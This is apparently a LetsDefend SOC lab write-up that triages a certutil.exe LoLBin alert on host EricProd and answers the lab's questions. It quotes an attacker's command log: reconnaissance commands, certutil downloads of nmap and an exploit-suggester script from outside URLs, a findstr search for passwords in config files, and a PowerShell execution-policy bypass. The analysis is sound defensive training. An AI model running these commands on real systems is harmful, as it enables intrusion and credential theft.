# discreption
- EventID :`113`
- Event Time :`Mar, 01, 2022, 11:06 AM`
- Rule :`SOC163 - Suspicious Certutil.exe Usage`
- Level :Security Analyst
- Hostname :`EricProd`
- IP Address :`172.16.17.22`
- Related Binary :`certutil.exe`
- Binary Path :`C:/Windows/System32/certutil.exe`
- Command Line : `certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip`
- Alert Trigger Reason : `-f parameter with certutil.exe`
- EDR Action : Allowed

```
A LoLBin is any binary supplied by the operating system that is normally used for legitimate purposes but can also be abused by malicious actors. Several default system binaries have unexpected side effects, which may allow attackers to hide their activities post-exploitation.
(definition: talosintelligence.com)
```
```
Determine which binary is supplied by the operating system but is also home to suspicious activities. To do this, you can resort to the alert details on the Monitoring page or Endpoint Security.
```
Certutil.exe: Attackers encode a file using base64 and then use CertUtil to download it from a remote URL to the victim’s device
`certutil.exe -urlcache -split -f https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py check.py`

- Certutil.exe: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil

```ps1
#01.03.2021 10:11
whoami
#01.03.2021 10:13
net user
#01.03.2021 10:16
net user
#01.03.2021 10:17
ipconfig
#01.03.2021 10:18
ipconfig /all
#01.03.2021 10:19
net Localgroup
#01.03.2021 10:22
net start
#01.03.2021 10:24
netstat
#301.03.2021 10:25
tasklist
#01.03.2021 10:27
systeminfo
#01.03.2021 11:06
certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-setup.exe nmap.zip
#01.03.2021 11:07
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py check.py
#01.03.2021 11:08
nmap -sV 192.168.0.0/24 -p 80
#01.03.2021 11:27
python3 check.py
#01.03.2021 18:54
arp -a
#01.03.2021 19:32
findstr /si pass *.txt | *.xml| *.ini
#01.03.2021 21:36
C:/powershell.exe -nop -exec bypass
```
- Q1
```
Previously, you found the related binary. Now, we’d like you to determine whether it was used for malicious purposes. You can use the link below to determine how legal binary can be used to perform malicious activities.

LOLBAS Project
There are some characteristics common to command lines:

They often have a file-path or other artifact as one of the arguments, that changes based on the user environment or machine, such as usernames or system GUIDs in file paths.
The order of arguments in the command change, or a single argument has a slightly different value.
They can have randomly generated strings in embedded URLs or file paths.
They can be obfuscated on purpose by attackers (variable assignment, invocation of string expressions created on the fly, etc).
(list source: sophos.com)


Is the current activity suspicious?
```
- `yes`

![image](https://github.com/seiffawal/Let-s-defend_events/assets/83987697/50317ca9-8c76-45a6-aaee-b054b8f2f867)

`https://lolbas-project.github.io/`
## Q2
- Determine Suspicious Activity: Yes, suspicious
## Q3
Question: What Is Suspicious Activity?
```ps
#01.03.2021 11:06
certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-setup.exe nmap.zip
#01.03.2021 11:07
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py check.py
```
`Download`
## Q4
Question: Who Performed the Activity?
after checking cmd log it know it's user
`User`
